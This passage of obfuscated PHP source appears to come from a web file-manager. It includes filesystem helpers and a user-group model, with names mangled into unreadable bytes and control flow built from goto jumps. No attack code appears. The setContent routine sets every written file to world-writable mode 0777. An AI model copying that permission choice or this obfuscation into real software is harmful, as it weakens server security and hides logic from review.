a◊ÂöÉ√Î: $dä≈‹ñ≈á™ =& $_SERVER[™⁄»üÆ]; check_abort_echo(); $Eâ¨È”øîé = rtrim($Eâ¨È”øîé, $dä≈‹ñ≈á™[8]) . $dä≈‹ñ≈á™[8]; goto BÔü›¿à™ê; FÁøÚ Œ£É: } private function folderInfo($bÕÉﬂÖºΩÃ, $C€Ω˘Çø“± = false) { $d†“ó∏ËôÇ =& $_SERVER[™⁄»üÆ]; $bÕÉﬂÖºΩÃ = rtrim($bÕÉﬂÖºΩÃ, $d†“ó∏ËôÇ[8]) . $d†“ó∏ËôÇ[8]; $Fôãã£Èƒ⁄ = $this->iconvApp($this->pathThis($bÕÉﬂÖºΩÃ)); if ($C€Ω˘Çø“±) { return array($d†“ó∏ËôÇ[28] => $Fôãã£Èƒ⁄, $d†“ó∏ËôÇ[76] => $this->getPathOuter($bÕÉﬂÖºΩÃ), $d†“ó∏ËôÇ[29] => $d†“ó∏ËôÇ[77]); } $F¡ÉæÇ¯æ∏ = array($d†“ó∏ËôÇ[28] => $Fôãã£Èƒ⁄, $d†“ó∏ËôÇ[76] => $this->getPathOuter($bÕÉﬂÖºΩÃ), $d†“ó∏ËôÇ[29] => $d†“ó∏ËôÇ[77], $d†“ó∏ËôÇ[194] => @filectime($bÕÉﬂÖºΩÃ), $d†“ó∏ËôÇ[84] => @filemtime($bÕÉﬂÖºΩÃ), $d†“ó∏ËôÇ[1263] => @fileatime($bÕÉﬂÖºΩÃ), $d†“ó∏ËôÇ[1264] => is_readable($bÕÉﬂÖºΩÃ), $d†“ó∏ËôÇ[1265] => is_writable($bÕÉﬂÖºΩÃ), $d†“ó∏ËôÇ[1266] => get_mode($bÕÉﬂÖºΩÃ)); return $F¡ÉæÇ¯æ∏; } private function fileInfo($f‹Öáå™÷ö, $D€â¥óı‚€ = false) { $FÚƒóç∑„ﬁ =& $_SERVER[™⁄»üÆ]; $b≤çàÉ…‡¢ = $this->iconvApp($this->pathThis($f‹Öáå™÷ö)); if ($D€â¥óı‚€) { return array($FÚƒóç∑„ﬁ[28] => $b≤çàÉ…‡¢, $FÚƒóç∑„ﬁ[76] => $this->getPathOuter($f‹Öáå™÷ö), $FÚƒóç∑„ﬁ[29] => $FÚƒóç∑„ﬁ[193], $FÚƒóç∑„ﬁ[78] => $this->size($f‹Öáå™÷ö), $FÚƒóç∑„ﬁ[168] => $this->ext($b≤çàÉ…‡¢)); } $CÈ˜øå¿«— = array($FÚƒóç∑„ﬁ[28] => $b≤çàÉ…‡¢, $FÚƒóç∑„ﬁ[76] => $this->getPathOuter($f‹Öáå™÷ö), $FÚƒóç∑„ﬁ[29] => $FÚƒóç∑„ﬁ[193], $FÚƒóç∑„ﬁ[194] => @filectime($f‹Öáå™÷ö), $FÚƒóç∑„ﬁ[84] => @filemtime($f‹Öáå™÷ö), $FÚƒóç∑„ﬁ[1263] => @fileatime($f‹Öáå™÷ö), $FÚƒóç∑„ﬁ[78] => $this->size($f‹Öáå™÷ö), $FÚƒóç∑„ﬁ[168] => $this->ext($b≤çàÉ…‡¢), $FÚƒóç∑„ﬁ[1264] => is_readable($f‹Öáå™÷ö), $FÚƒóç∑„ﬁ[1265] => is_writable($f‹Öáå™÷ö), $FÚƒóç∑„ﬁ[1266] => get_mode($f‹Öáå™÷ö)); return $CÈ˜øå¿«—; } public function exist($A◊Á∑”·≠∑) { $A◊Á∑”·≠∑ = $this->iconvSystem($A◊Á∑”·≠∑); return @file_exists($A◊Á∑”·≠∑); } public function isFile($C‡¶Ûø€≤ô) { $C‡¶Ûø€≤ô = $this->iconvSystem($C‡¶Ûø€≤ô); return @is_file($C‡¶Ûø€≤ô); } public function isFolder($fÔ¶∞‡¿êÊ) { $fÔ¶∞‡¿êÊ = $this->iconvSystem($fÔ¶∞‡¿êÊ); return @is_dir($fÔ¶∞‡¿êÊ); } public function listPath($BîÛ®œåœ≤, $E∂ƒ∑ØΩ≥¶ = false) { goto eÈó ∞‡€¥; eÈó ∞‡€¥: $C√ô¥´ÿ‚ =& $_SERVER[™⁄»üÆ]; $BîÛ®œåœ≤ = $this->iconvSystem($BîÛ®œåœ≤); $BîÛ®œåœ≤ = rtrim($BîÛ®œåœ≤, $C√ô¥´ÿ‚[8]) . $C√ô¥´ÿ‚[8]; goto d®éù≠»†µ; c∞«∆Ï§â∑: closedir($fñÇ‚¨≈); return $Föáì≤™∏å; goto b§æ‘·ëﬁ…; d®éù≠»†µ: $Föáì≤™∏å = array($C√ô¥´ÿ‚[75] => array(), $C√ô¥´ÿ‚[74] => array()); if (!($fñÇ‚¨≈ = @opendir($BîÛ®œåœ≤))) { return $Föáì≤™∏å; } while (($E∏Òûáã∆» = readdir($fñÇ‚¨≈)) !== !1) { if ($E∏Òûáã∆» == $C√ô¥´ÿ‚[95] || $E∏Òûáã∆» == $C√ô¥´ÿ‚[1260]) { continue; } $D≈ÿ¿˘å©á = $BîÛ®œåœ≤ . $E∏Òûáã∆»; if (is_file($D≈ÿ¿˘å©á)) { $Föáì≤™∏å[$C√ô¥´ÿ‚[74]][] = $this->fileInfo($D≈ÿ¿˘å©á, $E∂ƒ∑ØΩ≥¶); } else { $Föáì≤™∏å[$C√ô¥´ÿ‚[75]][] = $this->folderInfo($D≈ÿ¿˘å©á, $E∂ƒ∑ØΩ≥¶); } } goto c∞«∆Ï§â∑; b§æ‘·ëﬁ…: } public function listAll($Däª∫·÷Ö, &$d‹≠º·öÍö = array()) { goto e‚¢≤≤≈•Ú; Cûó§∫‘â÷: return $d‹≠º·öÍö; goto céÍãì∑»å; e‚¢≤≤≈•Ú: $F≥àÙùÒ£∑ =& $_SERVER[™⁄»üÆ]; $Däª∫·÷Ö = $this->iconvSystem($Däª∫·÷Ö); $Däª∫·÷Ö = rtrim($Däª∫·÷Ö, $F≥àÙùÒ£∑[8]) . $F≥àÙùÒ£∑[8]; goto dËª´øÌï‡; dËª´øÌï‡: if (!($cÕ•åÚóÕ∞ = @opendir($Däª∫·÷Ö))) { return $d‹≠º·öÍö; } while (($d¯ÜíèΩÊ  = readdir($cÕ•åÚóÕ∞)) !== !1) { if ($d¯ÜíèΩÊ  == $F≥àÙùÒ£∑[95] || $d¯ÜíèΩÊ  == $F≥àÙùÒ£∑[1260]) { continue; } $bàÜ®÷ßŒá = $Däª∫·÷Ö . $d¯ÜíèΩÊ ; if (is_dir($bàÜ®÷ßŒá) && !is_link($bàÜ®÷ßŒá)) { $d‹≠º·öÍö[] = array($F≥àÙùÒ£∑[76] => $bàÜ®÷ßŒá . $F≥àÙùÒ£∑[8], $F≥àÙùÒ£∑[77] => 1, $F≥àÙùÒ£∑[84] => @filemtime($bàÜ®÷ßŒá), $F≥àÙùÒ£∑[78] => 0); $this->listAll($bàÜ®÷ßŒá, $d‹≠º·öÍö); } else { $d‹≠º·öÍö[] = array($F≥àÙùÒ£∑[76] => $bàÜ®÷ßŒá, $F≥àÙùÒ£∑[77] => 0, $F≥àÙùÒ£∑[84] => @filemtime($bàÜ®÷ßŒá), $F≥àÙùÒ£∑[78] => $this->size($bàÜ®÷ßŒá)); } } closedir($cÕ•åÚóÕ∞); goto Cûó§∫‘â÷; céÍãì∑»å: } public function has($B∂˘áé…⁄Ô, $Bïπá¢àé» = false, $fÕ£æ†≠ÁÂ = true) { goto bÏ»ãÃâà; FÍÔüﬂÉºÜ: if (!($fåﬁß√äµÇ = @opendir($B∂˘áé…⁄Ô))) { return !1; } $CôÌ¶£ÊÀã = 0; $Eåëï¶ó› = 0; goto f¶ÕèÎÔìì; bÏ»ãÃâà: $cÊàòáÇ∏ò =& $_SERVER[™⁄»üÆ]; $B∂˘áé…⁄Ô = $this->iconvSystem($B∂˘áé…⁄Ô); $B∂˘áé…⁄Ô = rtrim($B∂˘áé…⁄Ô, $cÊàòáÇ∏ò[8]) . $cÊàòáÇ∏ò[8]; goto FÍÔüﬂÉºÜ; f¶ÕèÎÔìì: $FÔ≥ˆ…èâƒ = 0; while (($aÎÑì°™öª = readdir($fåﬁß√äµÇ)) !== !1) { if ($aÎÑì°™öª == $cÊàòáÇ∏ò[95] || $aÎÑì°™öª == $cÊàòáÇ∏ò[1260]) { continue; } $D…ÍÂÏúê‰ = $B∂˘áé…⁄Ô . $aÎÑì°™öª; if ($Bïπá¢àé») { $FÔ≥ˆ…èâƒ++; if (@is_file($D…ÍÂÏúê‰)) { $CôÌ¶£ÊÀã++; } else { $Eåëï¶ó›++; } if ($FÔ≥ˆ…èâƒ > 10000) { break; } continue; } if ($fÕ£æ†≠ÁÂ) { if (@is_file($D…ÍÂÏúê‰)) { return !0; } } else { if (@is_dir($D…ÍÂÏúê‰ . $cÊàòáÇ∏ò[8])) { return !0; } } } closedir($fåﬁß√äµÇ); goto DËü›∫±åù; DËü›∫±åù: if ($Bïπá¢àé») { return array($cÊàòáÇ∏ò[203] => $CôÌ¶£ÊÀã, $cÊàòáÇ∏ò[204] => $Eåëï¶ó›); } return !1; goto CªıÍ˜ˆç“; CªıÍ˜ˆç“: } public function hashSimple($F∞∏Ü¡£®Ã) { goto c§∆ñ ÂÉó; bßÑΩ“˜é: return md5($EàÊ¯πÿ˘Ω) . $Aç ÛÊ∂ ; goto düÛ¢Ó‹«⁄; b™ûÜÊªô©: fseek_64($Côï”ÛñÂü, $Aç ÛÊ∂  - $e”åÔÁ∂í); $EàÊ¯πÿ˘Ω .= fread($Côï”ÛñÂü, $e”åÔÁ∂í); fclose($Côï”ÛñÂü); goto bßÑΩ“˜é; c§∆ñ ÂÉó: $cÂÑ¢ë˘√ÿ =& $_SERVER[™⁄»üÆ]; if (!$F∞∏Ü¡£®Ã) { return md5($cÂÑ¢ë˘√ÿ[33]); } $F∞∏Ü¡£®Ã = $this->iconvSystem($F∞∏Ü¡£®Ã); goto b¢›—âùÇˆ; b¢›—âùÇˆ: $Aç ÛÊ∂  = $this->size($F∞∏Ü¡£®Ã); $e”åÔÁ∂í = 200; $eÁà¡Ñè„è = 50; goto FéêÖœò÷≠; E¯»òƒã∞ƒ: $Côï”ÛñÂü = fopen($F∞∏Ü¡£®Ã, $cÂÑ¢ë˘√ÿ[1267]); if (!$Côï”ÛñÂü) { return $EàÊ¯πÿ˘Ω; } for ($B¥ß˜é©£… = 0; $B¥ß˜é©£… < $eÁà¡Ñè„è; $B¥ß˜é©£…++) { fseek_64($Côï”ÛñÂü, $eˆ÷¯–ò¥£ * $B¥ß˜é©£…); $EàÊ¯πÿ˘Ω .= fread($Côï”ÛñÂü, $e”åÔÁ∂í); } goto b™ûÜÊªô©; FéêÖœò÷≠: if ($Aç ÛÊ∂  <= $e”åÔÁ∂í * $eÁà¡Ñè„è) { return $this->hashMd5($F∞∏Ü¡£®Ã) . $Aç ÛÊ∂ ; } $EàÊ¯πÿ˘Ω = $cÂÑ¢ë˘√ÿ[33]; $eˆ÷¯–ò¥£ = intval($Aç ÛÊ∂  / $eÁà¡Ñè„è); goto E¯»òƒã∞ƒ; düÛ¢Ó‹«⁄: } public function getContent($eãÑÂ§ı·æ) { $eãÑÂ§ı·æ = $this->iconvSystem($eãÑÂ§ı·æ); return file_get_contents($eãÑÂ§ı·æ); } public function setContent($AÿØâ¯„ﬂù, $cŸ¨Ëì∫Ç÷ = '') { $AÿØâ¯„ﬂù = $this->iconvSystem($AÿØâ¯„ﬂù); $AŒ∫Ü ‹ºΩ = @file_put_contents($AÿØâ¯„ﬂù, $cŸ¨Ëì∫Ç÷, LOCK_EX); clearstatcache(); @chmod($AÿØâ¯„ﬂù, 511); return $AŒ∫Ü ‹ºΩ === !1 ? !1 : !0; } public function fileSubstr($fÒ≥úÏ£≠—, $B∆™ñÀõöÀ = 0, $FçµËïñå† = false) { goto eÿÁü÷‰Ïá; A≥°˘ñõé´: if ($FçµËïñå† <= 0) { return $fÇÙïÀæºÑ[33]; } $eèÖÖ´Ô√ê = fopen($fÒ≥úÏ£≠—, $fÇÙïÀæºÑ[1267]); if (!$eèÖÖ´Ô√ê) { return !1; } goto BÃŸìùÂÿí; BÃŸìùÂÿí: fseek_64($eèÖÖ´Ô√ê, $B∆™ñÀõöÀ); $a÷—êí–Çò = fread($eèÖÖ´Ô√ê, $FçµËïñå†); fclose($eèÖÖ´Ô√ê); goto eäÛüõˆ–•; eäÛüõˆ–•: return $a÷—êí–Çò; goto EœÈ¢åàî„; eÿÁü÷‰Ïá: $fÇÙïÀæºÑ =& $_SERVER[™⁄»üÆ]; $fÒ≥úÏ£≠— = $this->iconvSystem($fÒ≥úÏ£≠—); if ($FçµËïñå† === !1) { $FçµËïñå† = $this->size($fÒ≥úÏ£≠—); } goto A≥°˘ñõé´; EœÈ¢åàî„: } public function upload($C†ùŒ˜â‚≥, $dÍõÈ ãÒ©, $còÔ‚ïó≤— = false, $fÉ£ÇÉäÆ˘ = REPEAT_REPLACE) { if ($còÔ‚ïó≤—) { return $this->moveFile($dÍõÈ ãÒ©, $C†ùŒ˜â‚≥); } return $this->copyFile($dÍõÈ ãÒ©, $C†ùŒ˜â‚≥); } public function setModifyTime($Eﬂ•çÇòü¡, $A˘◊¨îùã„ = '') { @touch($Eﬂ•çÇòü¡, intval($A˘◊¨îùã„)); } public function download($D”Ú∑µÜ”ê, $døòﬁÔ⁄πÚ) { return $this->iconvSystem($D”Ú∑µÜ”ê); } } goto CÙÔ÷›õ“©; FèÙ£≥êÓ≤: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\x70"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\x61\155\145" => "\x67\x72\x6f\x75\160\x5f\x6d\145\x74\141", "\x6d\145\x74\x61\106\x69\145\x6c\x64" => "\147\162\x6f\165\x70\111\x44"); protected function cacheFunctionAlias($b”ä‚ù±Ëπ) { $bõå¥êá¢° =& $_SERVER[™⁄»üÆ]; return array($bõå¥êá¢°[1780] => array($b”ä‚ù±Ëπ[0], $bõå¥êá¢°[1781]), $bõå¥êá¢°[1782] => array($b”ä‚ù±Ëπ[0], $bõå¥êá¢°[1783])); } protected function getInfo($A∏Ÿıß–¢Ç, $b‘◊Ê´¨ß = false) { $A¥∏‰ÂõÜÖ = $this->getInfoSimple($A∏Ÿıß–¢Ç); if (!$A¥∏‰ÂõÜÖ) { return !1; } if ($b‘◊Ê´¨ß) { return $this->_listDataApplyItem($A¥∏‰ÂõÜÖ); } return $this->cacheFunctionGet($_SERVER[™⁄»üÆ][1784], $A∏Ÿıß–¢Ç); } protected function getInfoSimple($A†èﬂååûò, $cπ∞ÔÚ÷√∑ = false) { $A©–¬Ø§Œ© =& $_SERVER[™⁄»üÆ]; if ($cπ∞ÔÚ÷√∑) { $eµìì∑Îòç = array($A©–¬Ø§Œ©[1706] => intval($A†èﬂååûò)); $AµÈë˜Ëë‰ = $this->where($eµìì∑Îòç)->find(); return is_array($AµÈë˜Ëë‰) ? $AµÈë˜Ëë‰ : array(); } return $this->cacheFunctionGet($A©–¬Ø§Œ©[1785], $A†èﬂååûò); } protected function groupAdd($fÈ§ë·ºŸ) { goto e÷ªÿÒ¡ä…; b© ∆ºÍ»”: if ($eÛ‰°Ïèë[$E∫é•ÆºÜ˜[503]]) { $bÀ‹‹‚Ï¥Ë = $eÛ‰°Ïèë[$E∫é•ÆºÜ˜[503]] . $eÛ‰°Ïèë[$E∫é•ÆºÜ˜[1706]] . $E∫é•ÆºÜ˜[47]; } $Fåı∏≤Íä— = array($E∫é•ÆºÜ˜[414] => $this->groupNameAuto($fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[479]], $fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[28]]), $E∫é•ÆºÜ˜[395] => $fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[479]], $E∫é•ÆºÜ˜[567] => $bÀ‹‹‚Ï¥Ë, $E∫é•ÆºÜ˜[1786] => $fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1690]], $E∫é•ÆºÜ˜[1787] => 0, $E∫é•ÆºÜ˜[1710] => 0); if (isset($fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1729]])) { $Fåı∏≤Íä—[$E∫é•ÆºÜ˜[1729]] = $fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1729]]; } else { $DØ≠À∑´ôê = $this->max($E∫é•ÆºÜ˜[1729]); if (!$DØ≠À∑´ôê) { $DØ≠À∑´ôê = 0; } $Fåı∏≤Íä—[$E∫é•ÆºÜ˜[1729]] = $DØ≠À∑´ôê + 1; } goto A·ÜŸ•ÉÑ¥; EÏØì≠œ‘¢: if (isset($fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1788]])) { $this->metaSet($f‡≠¨ÌπåÆ, array($E∫é•ÆºÜ˜[1788] => $fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1788]], $E∫é•ÆºÜ˜[1789] => $fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1789]])); unset($fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1788]]); unset($fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1789]]); } Model($E∫é•ÆºÜ˜[1214])->groupRootAdd($f‡≠¨ÌπåÆ); return $f‡≠¨ÌπåÆ; goto E·¢ë•◊Éæ; e÷ªÿÒ¡ä…: $E∫é•ÆºÜ˜ =& $_SERVER[™⁄»üÆ]; if (!$fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[479]] && isset($fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1706]]) && $fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1706]] == 1) { if ($eÛ‰°Ïèë = $this->getInfoSimple($fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1706]], !0)) { return $fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1706]]; } } else { $eÛ‰°Ïèë = $this->getInfoSimple($fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[479]]); if (!$eÛ‰°Ïèë) { return !1; } } $bÀ‹‹‚Ï¥Ë = $E∫é•ÆºÜ˜[513]; goto b© ∆ºÍ»”; A·ÜŸ•ÉÑ¥: if (!empty($fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1706]])) { $Fåı∏≤Íä—[$E∫é•ÆºÜ˜[1706]] = $fÈ§ë·ºŸ[$E∫é•ÆºÜ˜[1706]]; } $f‡≠¨ÌπåÆ = $this->add($Fåı∏≤Íä—); $this->setNamePinyin($f‡≠¨ÌπåÆ, $Fåı∏≤Íä—[$E∫é•ÆºÜ˜[28]]); goto EÏØì≠œ‘¢; E·¢ë•◊Éæ: } protected function groupEdit($c§Ë‡ì®ü≤, $e§º›áäÙ÷) { goto bƒﬂªØ„ù¨; b’ΩÌõô¨í: $this->_clearChildrenCache($aïì’ÀØˆü); return $this->where(array($FêÑ„ãà‡‹[1790] => $c§Ë‡ì®ü≤))->save($e§º›áäÙ÷); goto cà”ÿ∑ÿÔœ; bƒﬂªØ„ù¨: $FêÑ„ãà‡‹ =& $_SERVER[™⁄»üÆ]; $aïì’ÀØˆü = $this->getInfoSimple($c§Ë‡ì®ü≤); if (!$aïì’ÀØˆü) { return !1; } goto F¬É˘•Ùóƒ; F¬É˘•Ùóƒ: if (!empty($e§º›áäÙ÷[$FêÑ„ãà‡‹[479]])) { $C»≠∂ÿ∂À™ = $this->getInfoSimple($e§º›áäÙ÷[$FêÑ„ãà‡‹[479]]); if (!$C»≠∂ÿ∂À™) { return !1; } if ($aïì’ÀØˆü[$FêÑ„ãà‡‹[1706]] == $C»≠∂ÿ∂À™[$FêÑ„ãà‡‹[1706]]) { return !1; } if ($e§º›áäÙ÷[$FêÑ„ãà‡‹[479]] != $aïì’ÀØˆü[$FêÑ„ãà‡‹[479]]) { if ($C»≠∂ÿ∂À™[$FêÑ„ãà‡‹[503]] !== $aïì’ÀØˆü[$FêÑ„ãà‡‹[503]] && strpos($C»≠∂ÿ∂À™[$FêÑ„ãà‡‹[503]], $aïì’ÀØˆü[$FêÑ„ãà‡‹[503]] . $aïì’ÀØˆü[$FêÑ„ãà‡‹[1706]] . $FêÑ„ãà‡‹[47]) === 0) { return !1; } $e§º›áäÙ÷[$FêÑ„ãà‡‹[567]] = $C»≠∂ÿ∂À™[$FêÑ„ãà‡‹[503]] . $e§º›áäÙ÷[$FêÑ„ãà‡‹[479]] . $FêÑ„ãà‡‹[47]; $this->_changeChildLevel($aïì’ÀØˆü, $C»≠∂ÿ∂À™); } } if (isset($e§º›áäÙ÷[$FêÑ„ãà‡‹[28]])) { $this->setNamePinyin($c§Ë‡ì®ü≤, $e§º›áäÙ÷[$FêÑ„ãà‡‹[28]]); } if (isset($e§º›áäÙ÷[$FêÑ„ãà‡‹[1788]])) { $this->metaSet($c§Ë‡ì®ü≤, array($FêÑ„ãà‡‹[1788] => $e§º›áäÙ÷[$FêÑ„ãà‡‹[1788]], $FêÑ„ãà‡‹[1789] => $e§º›áäÙ÷[$FêÑ„ãà‡‹[1789]])); unset($e§º›áäÙ÷[$FêÑ„ãà‡‹[1788]]); unset($e§º›áäÙ÷[$FêÑ„ãà‡‹[1789]]); } goto b’ΩÌõô¨í; cà”ÿ∑ÿÔœ: } private function _clearChildrenCache($FﬁÔ†Îôˆ÷) { $FåÁË∫÷Èö =& $_SERVER[™⁄»üÆ]; $EÇÂ•é€›€ = array($FåÁË∫÷Èö[567] => array($FåÁË∫÷Èö[526], $FﬁÔ†Îôˆ÷[$FåÁË∫÷Èö[503]] . $FﬁÔ†Îôˆ÷[$FåÁË∫÷Èö[1706]] . $FåÁË∫÷Èö[527])); $DÊ‰√î£Ã“ = $this->field($FåÁË∫÷Èö[1706])->where($EÇÂ•é€›€)->select(); foreach ($DÊ‰√î£Ã“ as $Aà»ñ±›ËÊ) { $this->_clearCache($Aà»ñ±›ËÊ[$FåÁË∫÷Èö[1706]]); } } private function _clearCache($CÀÔ°„ﬂ¥‹) { $eãÑ¡èœ§œ =& $_SERVER[™⁄»üÆ]; $this->cacheFunctionClear($eãÑ¡èœ§œ[1784], $CÀÔ°„ﬂ¥‹); $this->cacheFunctionClear($eãÑ¡èœ§œ[1785], $CÀÔ°„ﬂ¥‹); } private function _changeChildLevel($Cº ÁÜ†ˆå, $a€Ÿ€Éüπ•, $bÙˆ•§Í∂â = false) { goto b∫‹ÿ÷Á‰è; b∫‹ÿ÷Á‰è: $d¬ÙÊÇÉ„ﬁ =& $_SERVER[™⁄»üÆ]; $E®õﬁ◊ê◊‘ = $Cº ÁÜ†ˆå[$d¬ÙÊÇÉ„ﬁ[503]] . $Cº ÁÜ†ˆå[$d¬ÙÊÇÉ„ﬁ[1706]] . $d¬ÙÊÇÉ„ﬁ[47]; $eÀ»ì√íÃ‚ = $a€Ÿ€Éüπ•[$d¬ÙÊÇÉ„ﬁ[503]] . $a€Ÿ€Éüπ•[$d¬ÙÊÇÉ„ﬁ[1706]] . $d¬ÙÊÇÉ„ﬁ[47] . $Cº ÁÜ†ˆå[$d¬ÙÊÇÉ„ﬁ[1706]] . $d¬ÙÊÇÉ„ﬁ[47]; goto EÖÂÃ≤ë≥Ú; D√Æπúà·Æ: $this->_clearChildrenCache($Cº ÁÜ†ˆå); $this->where($eà–Éû∂›…)->data($aÓÍ‡ÏÃ√°)->save(); goto b»¥≤‡ã¢¥; EÖÂÃ≤ë≥Ú: if ($bÙˆ•§Í∂â) { $eÀ»ì√íÃ‚ = $a€Ÿ€Éüπ•[$d¬ÙÊÇÉ„ﬁ[503]] . $a€Ÿ€Éüπ•[$d¬ÙÊÇÉ„ﬁ[1706]] . $d¬ÙÊÇÉ„ﬁ[47]; } $eà–Éû∂›… = array($d¬ÙÊÇÉ„ﬁ[567] => array($d¬ÙÊÇÉ„ﬁ[526], $Cº ÁÜ†ˆå[$d¬ÙÊÇÉ„ﬁ[503]] . $Cº ÁÜ†ˆå[$d¬ÙÊÇÉ„ﬁ[1706]] . $d¬ÙÊÇÉ„ﬁ[527])); $aÓÍ‡ÏÃ√° = array($d¬ÙÊÇÉ„ﬁ[567] => array($d¬ÙÊÇÉ„ﬁ[575], "\162\145\160\154\x61\143\145\50\160\141\162\x65\x6e\164\114\145\x76\145\x6c\54\47{$E®õﬁ◊ê◊‘}\47\54\47{$eÀ»ì√íÃ‚}\47\51")); goto D√Æπúà·Æ; b»¥≤‡ã¢¥: } public function setNamePinyin($f’ëÀ—ƒ©, $B„Ù¶û∫ √ = false) { $fÉÓ‘àçàÇ =& $_SERVER[™⁄»üÆ]; if (!$B„Ù¶û∫ √) { $D·≠∂ªºé“ = $this->getInfoSimple($f’ëÀ—ƒ©); $B„Ù¶û∫ √ = $D·≠∂ªºé“[$fÉÓ‘àçàÇ[28]]; } if (!Input::check($B„Ù¶û∫ √, $fÉÓ‘àçàÇ[570])) { $this->metaSet($f’ëÀ—ƒ©, $fÉÓ‘àçàÇ[445], null); $this->metaSet($f’ëÀ—ƒ©, $fÉÓ‘àçàÇ[444], null); return; } $eµÚô∫Æ©† = array($fÉÓ‘àçàÇ[445] => str_replace($fÉÓ‘àçàÇ[50], $fÉÓ‘àçàÇ[33], Pinyin::encode($B„Ù¶û∫ √)), $fÉÓ‘àçàÇ[444] => Pinyin::encode($B„Ù¶û∫ √, $fÉÓ‘àçàÇ[571])); $this->metaSet($f’ëÀ—ƒ©, $eµÚô∫Æ©†); } protected function groupStatus($e´áﬁœ¡ÏÜ, $e√˘äƒ€Ÿò) { goto cá°Æ©√å∏; aà”úæ®ﬂ¨: if ($e√˘äƒ€Ÿò == $FáÓàÆöëÒ[87]) { $E‰Ø£—ØË˜ = $this->parentLevelArray($cîΩ˘≈ÁÓÒ[$FáÓàÆöëÒ[503]]); } else { $eÒàÚç“àØ = array($FáÓàÆöëÒ[567] => array($FáÓàÆöëÒ[526], $cîΩ˘≈ÁÓÒ[$FáÓàÆöëÒ[503]] . $cîΩ˘≈ÁÓÒ[$FáÓàÆöëÒ[1706]] . $FáÓàÆöëÒ[527])); $E‰Ø£—ØË˜ = $this->where($eÒàÚç“àØ)->field($FáÓàÆöëÒ[1706])->select(); $E‰Ø£—ØË˜ = array_to_keyvalue($E‰Ø£—ØË˜, $FáÓàÆöëÒ[33], $FáÓàÆöëÒ[1706]); } $E‰Ø£—ØË˜[] = $cîΩ˘≈ÁÓÒ[$FáÓàÆöëÒ[1706]]; $cÿéú…π≠Î = array(); goto FÏ”≈ìö¿€; cá°Æ©√å∏: $FáÓàÆöëÒ =& $_SERVER[™⁄»üÆ]; $cîΩ˘≈ÁÓÒ = $this->getInfoSimple($e´áﬁœ¡ÏÜ); if (!$cîΩ˘≈ÁÓÒ) { return !1; } goto aà”úæ®ﬂ¨; FÏ”≈ìö¿€: foreach ($E‰Ø£—ØË˜ as $e´áﬁœ¡ÏÜ) { $cÿéú…π≠Î[] = array($FáÓàÆöëÒ[1706] => $e´áﬁœ¡ÏÜ, $FáÓàÆöëÒ[93] => $FáÓàÆöëÒ[729], $FáÓàÆöëÒ[372] => $e√˘äƒ€Ÿò); $this->_clearCache($e´áﬁœ¡ÏÜ); } return Model($FáÓàÆöëÒ[1791])->addAll($cÿéú…π≠Î, array(), !0); goto c√‚Ωâ√ãÚ; c√‚Ωâ√ãÚ: } protected function groupRemove($aﬂì≠¥ûíÕ) { goto c¶ñãØò–; eÂìëáèΩÿ: $this->where(array($BÔ⁄ËçÖñË[479] => $aﬂì≠¥ûíÕ))->save(array($BÔ⁄ËçÖñË[479] => $aí‡¯Ù§ò«[$BÔ⁄ËçÖñË[479]])); Model($BÔ⁄ËçÖñË[1791])->where($eääâ¬áÉÆ)->delete(); Model($BÔ⁄ËçÖñË[1792])->where($eääâ¬áÉÆ)->delete(); goto bâÖ†¡«‹Ü; c¶ñãØò–: $BÔ⁄ËçÖñË =& $_SERVER[™⁄»üÆ]; $eääâ¬áÉÆ = array($BÔ⁄ËçÖñË[1706] => $aﬂì≠¥ûíÕ); $aí‡¯Ù§ò« = $this->where($eääâ¬áÉÆ)->find(); goto f≤øçë∆ﬁ”; bâÖ†¡«‹Ü: Model($BÔ⁄ËçÖñË[809])->groupRootRemove($aﬂì≠¥ûíÕ); return $this->where($eääâ¬áÉÆ)->delete(); goto b®πæ√ó÷Ê; f≤øçë∆ﬁ”: if (!$aí‡¯Ù§ò« || $aí‡¯Ù§ò«[$BÔ⁄ËçÖñË[479]] == 0) { return !1; } $aØ∏œ Ç±Ï = $this->getInfoSimple($aí‡¯Ù§ò«[$BÔ⁄ËçÖñË[479]]); $this->_changeChildLevel($aí‡¯Ù§ò«, $aØ∏œ Ç±Ï, !0); goto eÂìëáèΩÿ; b®πæ√ó÷Ê: } protected function groupSort($dÿ∞∂Í‚∑Î) { $cÆËé®‰â‚ =& $_SERVER[™⁄»üÆ]; $fº¥ÉàâÃé = array(); foreach ($dÿ∞∂Í‚∑Î as $C“ü‰º†‡ı => $E®êì…ëñÚ) { $fº¥ÉàâÃé[] = array($cÆËé®‰â‚[1706], $E®êì…ëñÚ, $cÆËé®‰â‚[1729], $C“ü‰º†‡ı + 1); } $this->saveAll($fº¥ÉàâÃé); } public function listData() { $CÛÛº’ÿàª = $this->_makeOrder()->selectPage(50); $this->_listDataApply($CÛÛº’ÿàª[$_SERVER[™⁄»üÆ][367]]); return $CÛÛº’ÿàª; } private function _makeOrder($dÕâÀ„∫Ö◊ = '') { goto c”Êê¬·ö∑; eì∏éÎÿÇô: $dÕâÀ„∫Ö◊ = $dÕâÀ„∫Ö◊ . "{$d˜ª∆í∑∞‘}\x20{$cçàÙú›∑≈}\x2c\x20\147\x72\x6f\165\x70\111\x44\40\x61\x73\143"; return $this->order($dÕâÀ„∫Ö◊); goto b‚û«⁄ŸÈ; c”Êê¬·ö∑: $EŸêÎûºù∑ =& $_SERVER[™⁄»üÆ]; $EÌ¡‘‹◊Üä = array($EŸêÎûºù∑[1706], 